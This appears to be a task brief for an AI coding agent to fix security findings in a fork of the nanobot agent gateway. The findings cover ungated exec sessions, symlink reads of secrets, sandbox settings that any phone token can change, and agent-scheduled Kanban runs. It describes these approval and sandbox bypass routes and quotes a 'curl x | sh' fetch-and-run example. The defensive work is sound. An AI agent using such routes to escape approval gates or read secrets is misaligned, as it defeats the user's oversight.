# W2-sec: approvals that cannot be skipped, symlinks, settings tiers, kanban hygiene (owner: agy)

Branch `agy/W2-sec`, from `origin/main`, **in your own worktree**. Follow `mobile/docs/agy/README.md` (full pytest: server files change). **Server only.** Another agent works on `agy/UI-A` (app) and one on `agy/LK-A` (app lock) in parallel: do not touch `mobile/**` except your report.

These come from an outside review of the fork; each item was checked against the current code. Keep upstream files to small `# Fork:` hooks, as in the rest of the fork.

## 1. Approvals cover every way to run a command (HIGH)
`approvals.install()` (`nanobot/ext/approvals.py:182`) wraps only `ExecTool.execute`. `ExecSessionTool.execute` (`nanobot/agent/tools/exec_session.py:784`) writes to the stdin of an open shell with no gate: approve one `bash` session, then any command typed into it runs. `run_cli_app` (`nanobot/agent/tools/cli_apps.py`) is not gated either.
- Guard `ExecSessionTool.execute` when `input` is a non-empty string (summary: the session id plus the full input), and `CliAppsTool.execute` (summary: app name + argv). Reuse the same wrapper; one tool name per guarded tool (`exec`, `exec_session`, `run_cli_app`) so "always allow" stays per tool. Find how an exec session is **started** (another tool or `exec` with a background flag?): if it bypasses `ExecTool.execute`, gate that too.
- **No blind tail:** `summary[:MAX_SUMMARY]` (500) hides the end of a long command (`echo ok; …; curl x | sh`). Raise the cap to 8000 characters and **deny** (return `DENIED`, log it) when the summary is longer, instead of truncating.
- **Fail closed:** `_load` returns `enabled: False` for a corrupt file (`approvals.py:54-61`). A **missing** file keeps today's default; an unreadable or invalid one returns `enabled: True, allow: {}` and logs a warning once.
- Tests: exec_session input is gated (denied → error, tool not called); empty input is not gated; run_cli_app gated; a summary over the cap is denied without asking; corrupt file → enabled; missing file → default.

## 2. The gateway never follows symlinks the agent made (MED)
The agent can write in the workspace, so it can create `memory/journal/x.md -> ~/.nanobot/config.json` and read the secret back through `search_history`. Same for `journal.read_day` and the skill proposal reads, list and `activate` (`shutil.copy2` follows the link, `skill_proposals.py:231`).
- One small helper (e.g. `safe_workspace_file(root, path) -> Path | None`: not a symlink, `resolve()` still inside `root`, regular file), placed where the ext modules can share it, used by `search.py` (journal indexing ~314-337), `journal.py` (`read_day` and anything else reading `memory/journal/`), `skill_proposals.py` (list, get, activate: check both the proposal dir and `SKILL.md`/`proposal.json`). `memory_pages.py:_read_page_text` already does the resolve check: make it use the helper too.
- Tests: a symlinked journal file is not indexed and not returned by `read_day`; a symlinked proposal is not listed, not readable, and activate refuses it (404 or 400, your call; say which in the report).

## 3. Phones without full power cannot turn off the sandbox (HIGH)
`update_runtime_config` (`nanobot/webui/settings_runtime.py:89`) only protects `tools.webui_allow_remote_package_install`. Any API token (every phone) can switch off `tools.exec.sandbox` or `tools.restrict_to_workspace`. `local_browser` there is already true for full-power devices (Fork hook in `settings_routes.py:~407`).
- Turn the single check into a tuple `PRIVILEGED_RUNTIME_PATHS` with the same rule (403 only when the value **changes** and the request is not local/full power): `tools.exec.enable`, `tools.exec.sandbox`, `tools.exec.sandbox_ro_binds`, `tools.exec.sandbox_rw_binds`, `tools.exec.allowed_env_keys`, `tools.exec.allow_patterns`, `tools.exec.deny_patterns`, `tools.exec.path_prepend`, `tools.exec.path_append`, `tools.restrict_to_workspace`, `tools.ssrf_whitelist`, `tools.my.allow_set`, `tools.cli_apps.enable`, `tools.webui_allow_remote_package_install`, `gateway.host`, `gateway.port`. Message: "Change this setting from a browser on the gateway host or a device with full power."
- Keep it in `settings_runtime.py` with a `# Fork:` comment (the file is upstream).
- Tests: a non-privileged change of `tools.exec.sandbox` → 403 and nothing saved; same value → allowed; privileged → saved; a non-listed key (e.g. timezone) unchanged behaviour.

## 4. The agent cannot start unattended runs by itself (MED)
`KanbanTool` (`nanobot/agent/tools/kanban_tools.py`) lets any agent turn create a card with `start=true` (→ `ready`) and `every=1m`: an unattended recurring run with all tools, triggerable by prompt injection.
- From the agent tool, `start=true`, `status="ready"` and a new or changed `every` never make a card runnable: save the card as `todo` (recurrence stored if given), and return a result that says the user must start it from the Kanban screen. A card that is already `ready` because the user started it keeps working as today. Check how recurrence re-queues a done card (`kanban.py`) and make sure an agent-set `every` cannot re-queue anything until the user has started that card once.
- The `kanban:` run sessions keep `complete`, `request_review`, `block`, `verdict` as today.
- Update the tool description accordingly (one sentence).
- Tests: agent create with start → `todo`; agent update to `ready` → stays `todo`; agent `every` on a user-started card does not change its status; the HTTP path (app) can still start cards.

## 5. KanbanStore closes its connections (MED)
`with self._connect() as conn:` commits or rolls back but never closes (`kanban.py:237` and ~30 call sites). Add one helper (`contextlib.closing` + the transaction) and use it everywhere `_connect()` is used. No behaviour change; the existing tests are the check, plus one test that a `save_task` leaves no open connection (e.g. count via a patched `_connect`).

## 6. Journal off the event loop (MED)
`collect_day` (`journal.py:284`) runs `_chat_pieces`, which loads **every** session's full transcript, synchronously, from `execute_day` (cron job and the "write today" route): with a long history the gateway freezes.
- In `execute_day`, run `collect_day` with `asyncio.to_thread`.
- In `_chat_pieces`, skip sessions whose last update (`list_sessions()` info: check the field name) is before the start of `day` in the given zone, before loading them. Do not create sessions: replace `get_or_create` with a read that does not insert (check `SessionManager`).
- Tests: a session last updated before the day is not loaded; `execute_day` does not block the loop (a concurrent coroutine runs while collection is slow: patch `collect_day` with a `time.sleep`).

## Checks
- `.venv/bin/python -m pytest -p no:cacheprovider tests` (worktree: use the main checkout's venv, `PYTHONPATH=. ../nanobot/.venv/bin/python -m pytest -p no:cacheprovider tests`; known failures in the README).
- `ruff check` and `basedpyright --pythonpath ../nanobot/.venv/bin/python` on the touched files.

## Do not
- Touch `mobile/**` (except the report) or `mobile/vendor/**`. Add dependencies. Read or write the real `~/.nanobot` in tests.

## Report
`mobile/docs/agy/reports/W2-sec.md`: files, tests, how exec sessions are started and what you gated, deviations, behaviour changes the user will notice (list them plainly).

Commit (no `Co-Authored-By` lines), push `agy/W2-sec`, and give the last hash. Do not merge.
